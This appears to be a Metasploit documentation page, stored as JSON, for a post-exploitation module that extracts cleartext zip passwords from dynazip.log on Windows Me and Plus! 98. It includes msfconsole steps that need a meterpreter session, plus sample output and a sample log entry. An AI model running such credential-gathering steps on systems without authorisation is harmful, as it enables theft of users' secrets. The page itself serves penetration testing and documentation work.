{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/gather/credentials/dynazip_log","result":{"data":{"moduleMetadataJson":{"id":"a6b75bd1-0a89-5b17-b9df-8501fb54aeb7","name":"Windows Gather DynaZIP Saved Password Extraction","fullname":"post/windows/gather/credentials/dynazip_log","description":"This module extracts clear text credentials from dynazip.log.\n        The log file contains passwords used to encrypt compressed zip\n        files in Microsoft Plus! 98 and Windows Me.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/gather/credentials/dynazip_log","documentationSlug":"/modules/documentation/post/windows/gather/credentials/dynazip_log"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  This post-exploitation module extracts clear text credentials from dynazip.log.</p>\n<p>  The dynazip.log file is located in <code class=\"language-text\">%WINDIR%</code> and contains log entries generated during encryption of Compressed Folders (zip files) in Microsoft速 Plus! 98 and Windows速 Me. Each log entry contains detailed diagnostic information generated during the encryption process, including the zip file name and the password used to encrypt the zip file in clear text.</p>\n<p>  Microsoft released details of the vulnerability in <a href=\"https://technet.microsoft.com/en-us/library/security/MS01-019\">Microsoft Security Bulletin MS01-019</a> rated as Critical. A patch which disabled use of the log file was also released; however the patch failed to clear the contents of the existing log file.</p>\n<p>  Microsoft速 Plus! 98 and Windows速 Me are no longer supported by Microsoft.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get meterpreter session</li>\n<li>Do: <code class=\"language-text\">use post/windows/gather/credentials/dynazip_log</code></li>\n<li>Do: <code class=\"language-text\">set SESSION &lt;session id&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should be able to see the extracted credentials in the module output</li>\n</ol>\n<h2 id=\"example-run\" style=\"position:relative;\"><a href=\"#example-run\" aria-label=\"example run permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Run</h2>\n<p>  <strong>Default Output</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(dynazip_log) &gt; exploit \n\n[+] Found DynaZip log file: C:\\WINDOWS\\dynazip.log\n[+] File: &#39;C:\\WINDOWS\\Desktop\\secret.zip&#39; -- Password: &#39;my secret password!&#39;\n[+] File: &#39;C:\\WINDOWS\\Desktop\\private.zip&#39; -- Password: &#39;priv8&#39;\n[+] File: &#39;C:\\WINDOWS\\Desktop\\thepasswordisaspace.zip&#39; -- Password: &#39; &#39;\n[+] File: &#39;C:\\WINDOWS\\Desktop\\earthbound.zip&#39; -- Password: &#39;fuzzy pickles&#39;\n\nZIP Passwords\n=============\n\nFile Path                                   Password\n---------                                   --------\nC:\\WINDOWS\\Desktop\\earthbound.zip           fuzzy pickles\nC:\\WINDOWS\\Desktop\\private.zip              priv8\nC:\\WINDOWS\\Desktop\\secret.zip               my secret password!\nC:\\WINDOWS\\Desktop\\thepasswordisaspace.zip   \n\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  <strong>Verbose Output</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(dynazip_log) &gt; set verbose true\nverbose =&gt; true\nmsf post(dynazip_log) &gt; exploit \n\n[+] Found DynaZip log file: C:\\WINDOWS\\dynazip.log\n[*] Processing log file (6614 bytes)\n[*] Processing log entry for C:\\WINDOWS\\Desktop\\secret.zip\n[+] File: &#39;C:\\WINDOWS\\Desktop\\secret.zip&#39; -- Password: &#39;my secret password!&#39;\n[*] Processing log entry for C:\\WINDOWS\\Desktop\\private.zip\n[+] File: &#39;C:\\WINDOWS\\Desktop\\private.zip&#39; -- Password: &#39;priv8&#39;\n[*] Processing log entry for C:\\WINDOWS\\Desktop\\thepasswordisaspace.zip\n[+] File: &#39;C:\\WINDOWS\\Desktop\\thepasswordisaspace.zip&#39; -- Password: &#39; &#39;\n[*] Processing log entry for C:\\WINDOWS\\Desktop\\earthbound.zip\n[+] File: &#39;C:\\WINDOWS\\Desktop\\earthbound.zip&#39; -- Password: &#39;fuzzy pickles&#39;\n[*] Processing log entry for C:\\WINDOWS\\Desktop\\this file is not encrypted.zip\n[*] Did not find a password\n\nZIP Passwords\n=============\n\nFile Path                                   Password\n---------                                   --------\nC:\\WINDOWS\\Desktop\\earthbound.zip           fuzzy pickles\nC:\\WINDOWS\\Desktop\\private.zip              priv8\nC:\\WINDOWS\\Desktop\\secret.zip               my secret password!\nC:\\WINDOWS\\Desktop\\thepasswordisaspace.zip   \n\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"example-log-entry\" style=\"position:relative;\"><a href=\"#example-log-entry\" aria-label=\"example log entry permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Log Entry</h2>\n<p>  An example dynazip.log log file entry is shown below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">--- DynaZIP ZIP Diagnostic Log - Version: 3.00.16 - 02/22/17  17:01:46 ---\nFunction:  5 \nlpszZIPFile: 0x00437538 \nC:\\WINDOWS\\Desktop\\secret.zip\nlpszItemList: 0x0059e878 \n&quot;secret.txt&quot;\nlpMajorStatus: 0x00000000 \nlpMajorUserData: 0x00000000 \nlpMinorStatus: 0x00000000 \nlpMinorUserData: 0x00000000 \ndosifyFlag: 0 \nrecurseFlag: 0 \ncompFactor: 5 \nquietFlag: 1 \npathForTempFlag: 0 \nlpszTempPath: 0x00000000 \n???\nfixFlag: 0 \nfixHarderFlag: 0 \nincludeVolumeFlag: 0 \ndeleteOriginalFlag: 0 \ngrowExistingFlag: 0 \nnoDirectoryNamesFlag: 0 \nconvertLFtoCRLFFlag: 0 \naddCommentFlag: 0 \nlpszComment: 0x00000000 \n???\nafterDateFlag: 0 \nlpszDate: 0x00000000 \noldAsLatestFlag: 0 \nincludeOnlyFollowingFlag: 0 \nlpszIncludeFollowing: 0x00000000 \n???\nexcludeFollowingFlag: 0 \nlpszExludeFollowing: 0x00000000 \n???\nnoDirectoryEntriesFlag: 0 \nincludeSysHiddenFlag: 1 \ndontCompressTheseSuffixesFlag: 0 \nlpszStoreSuffixes: 0x00000000 \n???\nencryptFlag: 1 \nlpszEncryptCode: 0x712185d4 \nmy secret password!\nlpMessageDisplay: 0x7120ca22 \nlpMessageDisplayData: 0x00000000 \nwMultiVolControl: 0x0000 \nwZipSubOptions: 0x0000 \nlResv1: 0x00000000 \nlResv2: 0x00000000 \nlpszExtProgTitle: 0x00000000 \n???\nlpRenameProc: 0x71203919 \nlpRenameUserData: 0x0059eb8a \nlpMemBlock: 0x004e3a0c \nlMemBlockSize: 6 </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"a6b75bd1-0a89-5b17-b9df-8501fb54aeb7"}}}